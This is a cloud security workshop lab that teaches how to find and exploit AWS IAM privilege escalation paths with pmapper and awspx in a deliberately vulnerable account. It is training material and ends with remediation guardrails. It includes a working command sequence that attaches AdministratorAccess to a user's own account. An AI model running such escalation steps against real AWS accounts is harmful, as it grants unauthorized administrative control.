# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 40 minutes

## Overview

Use **awspx**, **pmapper** (Principal Mapper), and **pathfinding.cloud** to identify and exploit privilege escalation paths in intentionally vulnerable IAM configurations.

**Learning Objectives:**
1. Visualize IAM relationships with awspx
2. Scan and analyze IAM with pmapper
3. Identify privilege escalation paths
4. Exploit misconfigurations to understand the risk

---

## Prerequisites

Complete [Lab 0 - Prerequisites](../lab-0-prerequisites/lab-0-prerequisites.md) before starting this lab. If you are taking this workshop at Wild West Hackin Fest, your environment is already preconfigured.

---

## Exercise 1: Setup awspx and pmapper

### Part A: Ingest AWS Data with awspx

awspx visualizes IAM relationships as an interactive graph.

1. Run the awspx ingest command to pull IAM data from your AWS account:
   ```bash
   docker exec -it awspx awspx ingest
   ```

   Expected output:
   ```
   [*] Collecting IAM data...
   [*] Processing 90 resources...
   [*] Graph updated successfully
   ```

2. Open awspx in your browser at [http://localhost](http://localhost)

3. Verify the graph loaded by searching for `iamws` in the search box - you should see the workshop IAM users

### Part B: Create pmapper Graph

pmapper analyzes IAM relationships and finds privilege escalation paths.

1. Create a graph of your AWS account:
   ```bash
   pmapper graph create
   ```

2. View the graph summary:
   ```bash
   pmapper graph display
   ```

   Expected output:
   ```
   Graph Data for Account:  <your-account-id>
     # of Nodes:              90 (16 admins)
     # of Edges:              317
     # of Groups:             3
     # of (tracked) Policies: 75
   ```

### Part C: Run pmapper Analysis

1. Run the privilege escalation analysis:
   ```bash
   pmapper analysis --output-type text
   ```

2. Review the findings. Look for users with names starting with `iamws-`:
   ```
   iamws-dev-self-service-user can escalate privileges by attaching a different policy to themselves
   iamws-team-onboarding-user can escalate privileges by creating access keys for another user
   iamws-integration-admin-user can escalate privileges by updating the trust policy of a role
   iamws-ci-runner-user can escalate privileges by passing a role to EC2
   ```

---

## Exercise 2: Scenario 1 - AttachUserPolicy (Self-Escalation)

The `iamws-dev-self-service-user` can attach any IAM policy to any user, including themselves.

### Part A: Identify with pmapper

Query the user's escalation capability:

```bash
pmapper query "who can do iam:AttachUserPolicy with *"
```

Look for this line in the output:
```
user/iamws-dev-self-service-user IS authorized to call action iam:AttachUserPolicy for resource *
```

### Part B: Understand via pathfinding.cloud

1. Navigate to [pathfinding.cloud IAM-007](https://pathfinding.cloud/paths/iam-007)
2. Review the **Attack Steps** section

### Part C: Exploit

Attach AdministratorAccess to the vulnerable user:

```bash
# Get credentials for the vulnerable user
export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s" \
  $(aws sts assume-role \
    --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/iamws-dev-self-service-role \
    --role-session-name exploit \
    --query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" \
    --output text))

# Verify identity
aws sts get-caller-identity

# Attach AdministratorAccess to self
aws iam attach-user-policy \
  --user-name iamws-dev-self-service-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Verify the policy was attached
aws iam list-attached-user-policies --user-name iamws-dev-self-service-user
```

Expected output:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

### Cleanup

Remove the attached policy before continuing:

```bash
aws iam detach-user-policy \
  --user-name iamws-dev-self-service-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Reset credentials
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

---

### Path 2: UpdateAssumeRolePolicy (Principal Access)

**pmapper Investigation:**

Query the user's escalation path:

```bash
pmapper query "can privesc14-UpdatingAssumeRolePolicy do iam:UpdateAssumeRolePolicy with *"
```

This user can modify trust policies on roles, allowing them to grant themselves access to assume privileged roles.

**pathfinding.cloud Investigation:**

1. Navigate to **Principal Access** → **[IAM-012: iam:UpdateAssumeRolePolicy](https://pathfinding.cloud/paths/iam-012)**

2. Review the path details:
   - **Description** — How modifying trust policies enables escalation
   - **Required Permissions** — The dangerous combination of permissions
   - **Attack Steps** — The specific API calls an attacker would use
   - **Remediation** — Trust policy hardening strategies

---

### Path 3: PassRole + EC2 (New PassRole)

**pmapper Investigation:**

Query the user's ability to pass roles:

```bash
pmapper query "can privesc3-CreateEC2WithExistingIP do iam:PassRole with *"
```

This user can pass high-privilege roles to EC2 instances they create, then access those credentials.

**pathfinding.cloud Investigation:**

1. Navigate to **New PassRole** → **[EC2-001: iam:PassRole + ec2:RunInstances](https://pathfinding.cloud/paths/ec2-001)**

2. Review the path details:
   - **Description** — How PassRole enables privilege escalation through compute services
   - **Required Permissions** — The PassRole + service combination
   - **Attack Steps** — Creating an instance and harvesting credentials
   - **Remediation** — Condition key restrictions on PassRole

---

### Path 4: CreateAccessKey (Principal Access)

**pmapper Investigation:**

Query for users who can create access keys for other principals:

```bash
pmapper query "who can do iam:CreateAccessKey with *"
```

This identifies users who can create credentials for other IAM users—potentially including admin users.

**pathfinding.cloud Investigation:**

1. Navigate to **Principal Access** → **[IAM-002: iam:CreateAccessKey](https://pathfinding.cloud/paths/iam-002)**

2. Review the path details:
   - **Description** — How creating keys for other users enables escalation
   - **Required Permissions** — The unrestricted CreateAccessKey permission
   - **Attack Steps** — Creating keys for privileged users
   - **Remediation** — Resource constraints limiting key creation to self

---

## Wrap-up

### Summary: Findings to Fencin' the Frontier Remediations

| Finding | Category | Fencin' the Frontier Exercise | Guardrail |
|---------|----------|----------------|-----------|
| AttachUserPolicy | Self-Escalation | Exercise 1 | **Permissions Boundary** |
| UpdateAssumeRolePolicy | Principal Access | Exercise 2 | **Trust Policy (Resource Policy)** |
| PassRole + EC2 | New PassRole | Exercise 3 | **Condition Key** |
| CreateAccessKey | Principal Access | Exercise 4 | **Resource Constraint** |

In the next lab, you will apply guardrails to the vulnerable infrastructure to remediate the privilege escalation paths.

---

## Optional: Additional pmapper Commands

If you finish early, explore these additional pmapper capabilities:

```bash
# Visualize the graph (requires graphviz)
pmapper graph visualize

# Find all paths to a specific role
pmapper query "who can pass role AdminRole to *"

# Check for cross-account access
pmapper analysis cross_account

# Export findings as JSON
pmapper analysis find_privesc --output json > findings.json
```

---